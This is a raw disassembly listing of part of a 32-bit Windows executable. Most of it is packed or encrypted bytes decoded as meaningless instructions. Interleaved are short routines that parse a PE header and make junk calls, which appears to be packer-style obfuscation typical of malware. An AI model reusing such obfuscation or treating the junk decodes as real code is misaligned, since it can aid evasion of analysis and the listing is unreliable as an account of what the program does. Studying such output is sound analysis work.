  411280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411281:	hlt    
  411282:	adc    DWORD PTR [esi-0x291edb95],0x32
  411289:	and    DWORD PTR [ecx+eax*8],ebp
  41128c:	sbb    dl,al
  41128e:	mov    dh,0x4c
  411290:	shl    BYTE PTR [esi+ecx*8],0x49
  411294:	test   DWORD PTR [eax-0x4c725628],0xf40af97a
  41129e:	adc    eax,DWORD PTR [edi+0x42af01a5]
  4112a4:	call   0xcfc8:0x4f7ce971
  4112ab:	sbb    ebx,DWORD PTR [ebp+0x6a203964]
  4112b1:	sub    eax,0x4fc177a2
  4112b6:	repz jne 0xc3a21de9
  4112bd:	ins    DWORD PTR es:[edi],dx
  4112be:	call   0xe1b8:0x78c72d7d
  4112c5:	test   al,0x66
  4112c7:	mov    edx,fs
  4112c9:	lds    edi,FWORD PTR [ecx+edx*1]
  4112cc:	rol    DWORD PTR [ecx],cl
  4112ce:	cmp    al,0x8
  4112d0:	shl    DWORD PTR [esi],1
  4112d2:	fidivr WORD PTR [ebx+0x543b01dc]
  4112d8:	mov    esi,0xeb23eca5
  4112dd:	and    BYTE PTR ds:0xaab9c875,ch
  4112e3:	lds    esp,FWORD PTR [esi-0x77]
  4112e6:	push   ebx
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x5f68f61e,eax
  411318:	xchg   BYTE PTR [esi-0x7a],dh
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411373
  411324:	cmc    
  411325:	sub    eax,0xb092e751
  41132a:	add    DWORD PTR [edi],0x44
  41132d:	xchg   dx,ax
  41132f:	popf   
  411330:	gs mov ah,0x90
  411333:	jno    0x41135e
  411335:	je     0x4113aa
  411337:	cli    
  411338:	ins    DWORD PTR es:[edi],dx
  411339:	jne    0x411346
  41133b:	xchg   ebx,eax
  41133c:	or     al,0x48
  41133e:	out    dx,al
  41133f:	inc    edi
  411340:	pop    es
  411341:	mov    ds:0x3bbd0180,eax
  411346:	add    al,al
  411348:	xchg   ebp,ebx
  41134a:	push   edi
  41134b:	xchg   ebx,eax
  41134c:	sub    DWORD PTR [ebx+eax*1+0x5c3780ae],0x4acab3f5
  411357:	and    al,0xf1
  411359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41135a:	mov    bl,0xdd
  41135c:	nop
  41135d:	ss arpl sp,bp
  411360:	inc    edi
  411361:	gs push 0x0
  411364:	adc    ah,ah
  411366:	retf   
  411367:	adc    BYTE PTR [eax-0x1bd877e1],ch
  41136d:	xor    al,0xae
  41136f:	icebp  
  411370:	push   ecx
  411371:	test   al,0xb5
  411373:	pushf  
  411374:	les    edi,FWORD PTR [eax]
  411376:	adc    eax,0x429e43f2
  41137b:	or     eax,eax
  41137d:	jns    0x4113f5
  41137f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411380:	sbb    eax,edx
  411382:	jecxz  0x41139c
  411384:	inc    eax
  411385:	ds push esp
  411387:	loope  0x411358
  411389:	pop    ecx
  41138a:	or     ecx,esp
  41138c:	idiv   ah
  41138e:	setno  BYTE PTR cs:[ebx]
  411392:	ret    0x4f6d
  411395:	pop    es
  411396:	sbb    edx,DWORD PTR [esi+0x3b]
  411399:	cmp    bh,BYTE PTR [edi]
  41139b:	or     DWORD PTR [edx+0x7760e711],esi
  4113a1:	xchg   ebx,eax
  4113a2:	nop    DWORD PTR [edi+ebx*8]
  4113a6:	or     DWORD PTR [esi],esp
  4113a8:	in     al,dx
  4113a9:	sbb    BYTE PTR [edx+ebx*8+0x58afd195],dh
  4113b0:	int    0x46
  4113b2:	std    
  4113b3:	data16 (bad) 
  4113b5:	loop   0x411377
  4113b7:	or     DWORD PTR ds:[ebp+0x21],esi
  4113bb:	stos   DWORD PTR es:[edi],eax
  4113bc:	sahf   
  4113bd:	ins    BYTE PTR es:[edi],dx
  4113be:	test   ecx,edx
  4113c0:	mov    dl,0x2c
  4113c2:	cmova  ebx,ebx
  4113c5:	and    dl,BYTE PTR [ecx-0x54]
  4113c8:	and    al,0xb5
  4113ca:	ins    DWORD PTR es:[edi],dx
  4113cb:	cmp    al,0xc1
  4113cd:	dec    eax
  4113ce:	jne    0x41143b
  4113d0:	mov    esi,0x6848964a
  4113d5:	mov    DWORD PTR [edx+0x2fafd787],ebp
  4113db:	lds    ebp,FWORD PTR [edi-0x48184291]
  4113e1:	jle    0x4113d8
  4113e3:	mov    esi,0x2120359
  4113e8:	adc    eax,0xa6150529
  4113ed:	stc    
  4113ee:	push   ebx
  4113ef:	ss in  eax,dx
  4113f1:	stos   BYTE PTR es:[edi],al
  4113f2:	pusha  
  4113f3:	cli    
  4113f4:	outs   dx,BYTE PTR ds:[esi]
  4113f5:	mov    ebx,0x3e01210f
  4113fa:	cwde   
  4113fb:	cmp    dh,cl
  4113fd:	mov    ebp,0x45111a5d
  411402:	mov    bh,0x1c
  411404:	mov    dh,0x69
  411406:	mov    cl,BYTE PTR [edi]
  411408:	cmp    BYTE PTR [eax],ah
  41140a:	jb     0x4113b0
  41140c:	xchg   edi,eax
  41140d:	in     al,0x28
  41140f:	sbb    al,0x9f
  411411:	outs   dx,BYTE PTR ds:[esi]
  411412:	mov    ecx,0xd8842679
  411417:	imul   ebp,ecx,0xffffffd0
  41141a:	pushf  
  41141b:	jp     0x411443
  41141d:	sub    al,BYTE PTR [ecx*2+0x63faee54]
  411424:	xchg   edi,eax
  411425:	outs   dx,BYTE PTR ds:[esi]
  411426:	jmp    0x4113cf
  411428:	jbe    0x4113f4
  41142a:	pop    esp
  41142b:	sub    eax,0x8e8c683d
  411430:	(bad)  
  411432:	daa    
  411433:	mov    edi,0x1de7442e
  411438:	xchg   esi,eax
  411439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41143a:	dec    ebp
  41143b:	dec    eax
  41143c:	xchg   BYTE PTR [ebx],dl
  41143e:	test   eax,0x78e1b7eb
  411443:	aas    
  411444:	sbb    cl,BYTE PTR [esi-0x13]
  411447:	ds jmp 0x20c0:0x4d460c5b
  41144f:	inc    eax
  411450:	test   eax,0xc6728afa
  411455:	mov    dl,0x42
  411457:	aaa    
  411458:	or     al,0xf
  41145b:	leave  
  41145c:	fisttp WORD PTR [ebp-0x14]
  41145f:	push   ss
  411460:	jb     0x41142f
  411462:	ret    
  411463:	add    DWORD PTR [edx],ecx
  411465:	inc    edx
  411466:	data16 adc al,0x40
  411469:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41146b:	mov    bh,dl
  41146d:	(bad)  
  41146e:	gs jb  0x411443
  411471:	sbb    DWORD PTR [ebp-0x58f1d0c9],esi
  411477:	lahf   
  411478:	int3   
  411479:	enter  0xf9e6,0x1f
  41147d:	cs pop es
  41147f:	sahf   
  411480:	inc    eax
  411481:	stc    
  411482:	jbe    0x411474
  411484:	mov    bl,0x6f
  411486:	dec    esp
  411487:	inc    edi
  411488:	add    al,0x78
  41148a:	lds    ecx,FWORD PTR gs:[esi-0x21]
  41148e:	fwait
  41148f:	jmp    0xe4fc4246
  411494:	pop    edx
  411495:	xor    al,0x78
  411497:	in     al,0x4
  411499:	and    eax,0x504d1519
  41149e:	inc    eax
  41149f:	jl     0x41144e
  4114a1:	inc    ebp
  4114a2:	ret    0x810e
  4114a5:	ds into 
  4114a7:	xor    dh,bl
  4114a9:	retf   0x22c7
  4114ac:	outs   dx,BYTE PTR ds:[esi]
  4114ad:	dec    ecx
  4114ae:	cmp    dl,BYTE PTR [esp+ebx*4+0x3]
  4114b2:	js     0x411464
  4114b4:	or     al,0x54
  4114b6:	push   edx
  4114b7:	loopne 0x4114cb
  4114b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ba:	addr16 inc eax
  4114bc:	dec    ecx
  4114bd:	jmp    0x8803e182
  4114c2:	xchg   ebx,eax
  4114c3:	ss pop ebx
  4114c5:	jge    0x4114dc
  4114c7:	in     al,dx
  4114c8:	aam    0x19
  4114ca:	cmp    DWORD PTR [ebx-0x298a32b4],ecx
  4114d0:	test   eax,0xb1433e9f
  4114d5:	ss sbb eax,0xea931dff
  4114db:	cli    
  4114dc:	mov    bh,dl
  4114de:	sub    eax,0x91fcb85c
  4114e4:	jno    0x411519
  4114e6:	or     DWORD PTR [edx+0x13],esi
  4114e9:	and    al,0xa8
  4114eb:	mov    dl,0x9
  4114ed:	jbe    0x4114bc
  4114ef:	iret   
  4114f0:	xor    ecx,DWORD PTR [esi]
  4114f2:	(bad)  
  4114f3:	ins    BYTE PTR es:[edi],dx
  4114f4:	jp     0x411486
  4114f6:	pop    ebp
  4114f7:	mov    eax,ds:0xa15e1756
  4114fc:	dec    esi
  4114fd:	shl    BYTE PTR ds:[ebx+ecx*4+0x1d],cl
  411502:	cmp    ebp,DWORD PTR [edx-0x351ed8ea]
  411508:	loopne 0x411567
  41150a:	inc    eax
  41150b:	pop    edx
  41150c:	daa    
  41150d:	test   al,0xc3
  41150f:	mov    dh,0x80
  411511:	adc    BYTE PTR [edx],ch
  411513:	inc    edi
  411514:	lea    edx,[ebp-0x3a406de6]
  41151a:	jno    0x41156d
  41151c:	nop
  41151d:	or     eax,0x74e3d1c1
  411522:	ins    DWORD PTR es:[edi],dx
  411523:	jle    0x411540
  411525:	mov    al,ds:0xd197e842
  41152a:	sbb    BYTE PTR [edx+edx*4-0x2c],0xce
  41152f:	or     ebx,DWORD PTR ds:0xdc6ae2af
  411535:	hlt    
  411536:	pop    es
  411537:	sub    ebx,ebp
  411539:	sub    al,0x73
  41153b:	stos   DWORD PTR es:[edi],eax
  41153c:	daa    
  41153d:	sub    ch,BYTE PTR [edi-0x25e89bb2]
  411543:	je     0x4115bd
  411545:	dec    edi
  411546:	jmp    0x41150f
  411548:	cmp    eax,0xc5c7a8ea
  41154d:	mov    al,ds:0x8287a2cf
  411552:	imul   ebx,edi,0xffffffe8
  411555:	outs   dx,DWORD PTR ds:[esi]
  411556:	jg     0x4115be
  411558:	and    al,0x94
  41155a:	sub    bl,BYTE PTR [edx-0x74121439]
  411560:	call   0x4f2faa81
  411565:	test   al,0xaf
  411567:	or     DWORD PTR [ebp+0x37],esp
  41156a:	(bad)  
  41156b:	add    ebx,DWORD PTR ds:0x8c371f9c
  411571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411572:	shr    DWORD PTR [edi+edx*4+0x23e7ad7],1
  411579:	mov    edi,0xbdb846e1
  41157e:	data16 stos BYTE PTR es:[edi],al
  411580:	inc    ebp
  411581:	setne  BYTE PTR [ebx-0x39]
  411585:	sbb    eax,0x364c71a
  41158a:	pop    es
  41158b:	adc    edx,eax
  41158d:	mov    ebx,ebp
  41158f:	test   DWORD PTR [eax+0x70],eax
  411592:	ss ja  0x41154e
  411595:	stos   BYTE PTR es:[edi],al
  411596:	jb     0x4115a9
  411598:	mov    eax,DWORD PTR ds:0xa49737b2
  41159e:	or     dh,ah
  4115a0:	add    BYTE PTR [esi+0x2e32300a],bl
  4115a6:	fs repz mov esp,0xc5f7a4e9
  4115ad:	aas    
  4115ae:	dec    esi
  4115af:	mov    esp,0xe3588f15
  4115b4:	xchg   edi,eax
  4115b5:	scas   al,BYTE PTR es:[edi]
  4115b6:	rol    ah,0x9d
  4115b9:	xlat   BYTE PTR ds:[ebx]
  4115ba:	or     al,0x7e
  4115bc:	loopne 0x411567
  4115be:	add    DWORD PTR [edi-0x29],0xffffffa2
  4115c2:	(bad)  
  4115c3:	mov    edi,ecx
  4115c5:	mov    eax,ds:0xdad26c69
  4115ca:	aaa    
  4115cb:	and    al,0x6e
  4115cd:	ficomp WORD PTR [edi-0x3e]
  4115d0:	mov    eax,ds:0x8b706d7e
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	pop    ebp
  411619:	repz dec esp
  41161b:	loop   0x4115a3
  41161d:	inc    eax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x411608
  411625:	es adc eax,0x28f1311
  41162b:	mov    WORD PTR [ecx-0x5],es
  41162e:	sahf   
  41162f:	movsx  ebx,BYTE PTR [edx+0x391ac793]
  411636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411637:	push   esp
  411638:	and    al,BYTE PTR [ecx]
  41163a:	adc    al,0x79
  41163c:	mov    ds:0x3f710491,eax
  411641:	mov    ebp,0x8a72a36e
  411646:	sub    ah,0xac
  411649:	dec    eax
  41164a:	js     0x41169e
  41164c:	fwait
  41164d:	ret    0x607e
  411650:	xchg   ebp,eax
  411651:	add    bl,BYTE PTR [eax+0x64176897]
  411657:	inc    esp
  411658:	or     DWORD PTR [edi],edi
  41165a:	mov    ah,0xbe
  41165c:	adc    DWORD PTR [edi],0x567c9e47
  411662:	test   cl,ch
  411664:	add    DWORD PTR [esi+eiz*4-0x5e],esi
  411668:	(bad)  [ecx+eax*4-0x2e]
  41166c:	push   esp
  41166d:	pop    ebp
  41166e:	in     al,dx
  41166f:	add    eax,0x918ab634
  411674:	cmp    DWORD PTR [eax-0x68b99213],ecx
  41167a:	or     BYTE PTR [ebx],cl
  41167c:	loope  0x411655
  41167e:	xlat   BYTE PTR ds:[ebx]
  41167f:	xchg   ebp,eax
  411680:	fst    QWORD PTR [eax+0x4ce70eda]
  411686:	ja     0x4116c0
  411688:	mov    ah,0xc9
  41168a:	xor    eax,0x5a04d100
  41168f:	outs   dx,DWORD PTR ds:[esi]
  411690:	mov    bh,BYTE PTR [eax]
  411692:	loope  0x411622
  411694:	jle    0x411703
  411696:	sar    DWORD PTR [edi+0x732cf69b],0x7e
  41169d:	or     ebx,eax
  41169f:	outs   dx,DWORD PTR ds:[esi]
  4116a0:	ss push esp
  4116a2:	daa    
  4116a3:	xor    BYTE PTR [ebx-0x11],dl
  4116a6:	mov    BYTE PTR [ecx+ebx*2+0x4f76df0c],al
  4116ad:	imul   edi,DWORD PTR [edx-0x51bdedaa],0x92169e77
  4116b7:	jl     0x4116b7
  4116b9:	lods   eax,DWORD PTR ds:[esi]
  4116ba:	outs   dx,BYTE PTR ds:[esi]
  4116bb:	lds    esi,FWORD PTR [edi+0x45]
  4116be:	call   0x5ca66502
  4116c3:	ret    
  4116c4:	mov    ebp,0xdf61cf40
  4116c9:	dec    eax
  4116ca:	cmp    al,0x9d
  4116cc:	in     eax,0x75
  4116ce:	dec    ecx
  4116cf:	push   ds
  4116d0:	and    ecx,esi
  4116d2:	pop    ds
  4116d3:	sub    al,0x57
  4116d6:	sahf   
  4116d7:	add    esi,DWORD PTR [ebp+eiz*4-0x58]
  4116db:	xor    cl,bh
  4116dd:	idiv   DWORD PTR [ebp+0x28ccf5dc]
  4116e3:	mov    ebx,0x39f87df0
  4116e8:	sti    
  4116e9:	push   ebx
  4116ea:	mov    eax,ds:0xe048ba43
  4116ef:	mov    eax,0xf1870ab9
  4116f4:	add    eax,0x6d1751a2
  4116f9:	pop    ecx
  4116fa:	test   eax,0x20239ef1
  4116ff:	jno    0x4116d0
  411701:	xlat   BYTE PTR ds:[ebx]
  411702:	sub    eax,esp
  411704:	push   edi
  411705:	cdq    
  411706:	clc    
  411707:	pop    ss
  411708:	mov    cl,0xc2
  41170a:	lds    edx,FWORD PTR [ecx+0x537d1413]
  411710:	mov    gs,ecx
  411712:	push   edx
  411713:	push   es
  411714:	mov    esi,0xf6491ebc
  411719:	xor    al,0x88
  41171b:	call   0x9c7ba7a5
  411720:	and    bl,BYTE PTR [edx-0x84e4ec]
  411726:	enter  0x82d4,0x73
  41172a:	sbb    BYTE PTR [edi-0xd3bcc53],al
  411730:	cld    
  411731:	push   ss
  411732:	sbb    eax,DWORD PTR [ecx+0xc16b663]
  411738:	sub    esp,ebp
  41173a:	icebp  
  41173b:	bound  esp,QWORD PTR [eax]
  41173d:	(bad)  
  41173e:	jl     0x411769
  411740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411741:	mov    DWORD PTR [edx-0x1ed96ce1],esi
  411747:	(bad)  
  411748:	mov    ds:0x80437cf7,al
  41174d:	push   ds
  41174e:	push   0x4bc2c241
  411753:	jne    0x4117c7
  411755:	xchg   edi,eax
  411756:	outs   dx,BYTE PTR ds:[esi]
  411757:	xlat   BYTE PTR ds:[ebx]
  411758:	mov    ecx,0x8bb6aa76
  41175d:	movntps XMMWORD PTR [ebp+0x25ce17b8],xmm1
  411764:	xchg   esi,eax
  411765:	(bad)  
  411766:	lahf   
  411767:	ins    DWORD PTR es:[edi],dx
  411768:	jl     0x41175d
  41176a:	pop    ebp
  41176b:	loopne 0x4117c1
  41176d:	adc    DWORD PTR [ebx+0x1246820b],esp
  411773:	pop    ecx
  411774:	mov    eax,eax
  411776:	add    al,0xc5
  411778:	fist   DWORD PTR [edx+0x9df73f2]
  41177e:	cmp    al,0xe6
  411780:	adc    bh,bl
  411782:	or     dh,BYTE PTR [edi+0x21]
  411785:	into   
  411786:	imul   esi,DWORD PTR [ebx-0x33],0xb69f21c6
  41178d:	pop    ebx
  41178e:	or     eax,0x614df745
  411793:	xchg   esp,eax
  411794:	pop    esi
  411795:	je     0x411804
  411797:	sbb    al,0x13
  411799:	sub    BYTE PTR [ecx+0x30],bh
  41179c:	adc    BYTE PTR [eax+0x2a552258],al
  4117a2:	push   edi
  4117a3:	sti    
  4117a4:	or     DWORD PTR [eax+0x1df59680],esi
  4117aa:	mov    ebp,0xf42ecb0c
  4117af:	scas   al,BYTE PTR es:[edi]
  4117b0:	aam    0x69
  4117b2:	lahf   
  4117b3:	dec    ebp
  4117b4:	ja     0x4117a6
  4117b6:	cmc    
  4117b7:	adc    bh,ch
  4117b9:	ret    0xa332
  4117bc:	ret    0xe435
  4117bf:	lea    ebp,[esi+0x36]
  4117c2:	fcomi  st,st(7)
  4117c4:	retf   
  4117c5:	icebp  
  4117c6:	ja     0x4117a0
  4117c8:	dec    DWORD PTR [edx+0x116a833b]
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x433823,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43377f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	pop    ds
  4118e8:	in     eax,dx
  4118e9:	cmp    ah,BYTE PTR [esp+ebp*1-0x5b8181b2]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411955
  4118f4:	leave  
  4118f5:	pop    edi
  4118f6:	push   edx
  4118f7:	add    DWORD PTR [ebp+0x7e1d4190],eax
  4118fd:	std    
  4118fe:	and    eax,0x5ce66c43
  411903:	(bad)  
  411904:	and    BYTE PTR [eax],dl
  411906:	imul   ebx,DWORD PTR [esp+edx*8],0x11
  41190a:	add    dl,BYTE PTR [eax+0x60]
  41190d:	jo     0x41196e
  41190f:	sbb    si,0xb377
  411914:	jne    0x4118a6
  411916:	xchg   esp,eax
  411917:	mov    esi,0x9f3e34a3
  41191c:	mov    ebp,0x44af1faa
  411921:	repz loop 0x411908
  411924:	inc    esi
  411925:	stos   DWORD PTR es:[edi],eax
  411926:	out    0xac,eax
  411928:	sti    
  411929:	out    dx,eax
  41192a:	test   BYTE PTR [ebx],ch
  41192c:	add    al,0x8f
  41192e:	pusha  
  41192f:	ja     0x411987
  411931:	jmp    0x56ab2cdf
  411936:	out    0x46,eax
  411938:	(bad)
  41193b:	push   ss
  41193c:	scas   al,BYTE PTR es:[edi]
  41193d:	sbb    BYTE PTR [eax],ch
  41193f:	ds pop ds
  411941:	test   esp,esi
  411943:	imul   al
  411945:	mov    esp,cs
  411947:	and    dl,BYTE PTR [edx-0x42dc4bc9]
  41194d:	mov    eax,ds:0x18b792d8
  411952:	inc    ecx
  411953:	imul   ebx,ecx,0xcd26fc8a
  411959:	in     al,0x20
  41195b:	lock icebp 
  41195d:	unpcklps xmm1,XMMWORD PTR [ecx+edi*8]
  411961:	stos   BYTE PTR es:[edi],al
  411962:	sub    BYTE PTR [ebx+edx*2],al
  411965:	jae    0x4119d6
  411967:	outs   dx,DWORD PTR ds:[esi]
  411968:	lods   al,BYTE PTR ds:[esi]
  411969:	out    0x8c,al
  41196b:	or     BYTE PTR [ebp+0x62],bh
  41196e:	ffreep st(0)
  411970:	pop    ds
  411971:	pushf  
  411972:	fild   QWORD PTR [esi-0x1f]
  411976:	test   BYTE PTR [eax-0x6e],bh
  411979:	clc    
  41197a:	test   edx,edi
  41197c:	mov    ecx,0x51dbb379
  411981:	retf   
  411982:	sub    al,0x62
  411984:	cmp    esi,DWORD PTR [esi]
  411986:	push   eax
  411987:	xor    eax,0xff5e771b
  41198c:	(bad)  
  41198d:	xchg   ebp,eax
  41198e:	rcr    BYTE PTR [esi+0x45bfb4ff],0xf
  411995:	hlt    
  411996:	jno    0x411961
  411998:	mov    al,ds:0x72c5cd0c
  41199d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41199e:	mov    WORD PTR [ecx+ebp*1-0x1b69c852],ds
  4119a5:	jmp    0x4119ef
  4119a7:	xchg   ebp,eax
  4119a8:	imul   ebp,ecx,0x2c19bf0c
  4119ae:	adc    bl,BYTE PTR [eax+0x278e967f]
  4119b4:	out    0xbb,eax
  4119b6:	add    BYTE PTR [esp+eiz*4-0x50],dl
  4119ba:	(bad)  [esi]
  4119bc:	xor    eax,DWORD PTR [eax+ebp*2-0x26d9b1c5]
  4119c3:	shl    bh,cl
  4119c5:	lock push ebx
  4119c7:	test   BYTE PTR [ebp+0x6c],cl
  4119ca:	daa    
  4119cb:	das    
  4119cc:	xor    BYTE PTR [edi],bh
  4119ce:	sub    BYTE PTR [ecx-0x40ff32bf],0x9b
  4119d5:	jecxz  0x411a47
  4119d7:	leave  
  4119d8:	icebp  
  4119d9:	mov    al,0xe1
  4119db:	sbb    edi,DWORD PTR [ebx-0x64bd5bd7]
  4119e1:	mov    ah,0x10
  4119e3:	mov    WORD PTR [ecx+0x7f],es
  4119e6:	xor    DWORD PTR [esp+edi*8+0x75cdd2c7],edx
  4119ed:	or     bl,BYTE PTR [edi+ebx*4]
  4119f0:	push   edx
  4119f1:	sub    BYTE PTR [edi+0x6e324e16],ah
  4119f7:	retf   0x3e3a
  4119fa:	(bad)  
  4119fb:	repz adc DWORD PTR [esi+eiz*8],eax
  4119ff:	mov    eax,ds:0x9a2e865
  411a04:	aaa    
  411a05:	push   ebp
  411a06:	pop    ebx
  411a07:	popa   
  411a08:	mov    al,0x6f
  411a0a:	sub    ch,BYTE PTR [esi+edx*2]
  411a0d:	push   es
  411a0e:	mov    eax,ds:0x3cae500b
  411a13:	or     BYTE PTR [ecx-0x7b],bh
  411a16:	and    BYTE PTR [ebp+0x54f47010],al
  411a1c:	ret    
  411a1d:	call   0xded7f64f
  411a22:	inc    ebp
  411a23:	sbb    al,0xd5
  411a25:	retf   
  411a26:	pop    edx
  411a27:	push   ecx
  411a28:	int    0xe8
  411a2a:	int    0xb3
  411a2c:	mov    ebx,0x60faffe
  411a31:	lahf   
  411a32:	fisttp WORD PTR [esi]
  411a34:	dec    esi
  411a35:	mov    ch,0xa2
  411a37:	cmp    DWORD PTR [ecx],0x7e97fc25
  411a3d:	sti    
  411a3e:	adc    bl,BYTE PTR [ebx]
  411a40:	inc    esp
  411a41:	add    al,ah
  411a43:	sub    ch,BYTE PTR [edx+0x17134ed9]
  411a49:	out    0xa1,eax
  411a4b:	das    
  411a4c:	mov    bl,0x9d
  411a4e:	sbb    ebx,edi
  411a50:	ret    
  411a51:	xchg   ebp,eax
  411a52:	pop    ss
  411a53:	iret   
  411a54:	mov    ch,0x30
  411a56:	jmp    DWORD PTR [eax]
  411a58:	test   al,0xee
  411a5a:	(bad)  
  411a5b:	out    0xe9,al
  411a5d:	jle    0x411a9e
  411a5f:	(bad)  
  411a60:	call   0x7974:0x5d4368da
  411a67:	inc    ecx
  411a68:	inc    ecx
  411a69:	xor    al,0x80
  411a6b:	loope  0x411a13
  411a6d:	and    eax,0x2dc2c0d3
  411a72:	mov    ?,WORD PTR [edx]
  411a74:	ins    DWORD PTR es:[edi],dx
  411a75:	ret    
  411a76:	mov    dh,dl
  411a78:	scas   al,BYTE PTR es:[edi]
  411a79:	outs   dx,DWORD PTR ds:[esi]
  411a7a:	(bad)  
  411a7b:	in     eax,0xd7
  411a7d:	and    bh,BYTE PTR [edi-0x7b15c7b6]
  411a83:	inc    ebx
  411a84:	ss in  eax,dx
  411a86:	sub    DWORD PTR [edi-0x5a41e39d],0xfffffffa
  411a8d:	loopne 0x411a9d
  411a8f:	ror    DWORD PTR [edi+0x2a],0xdd
  411a93:	mov    dh,0x59
  411a95:	inc    ecx
  411a96:	fdivr  DWORD PTR [ebp-0x49d3610d]
  411a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
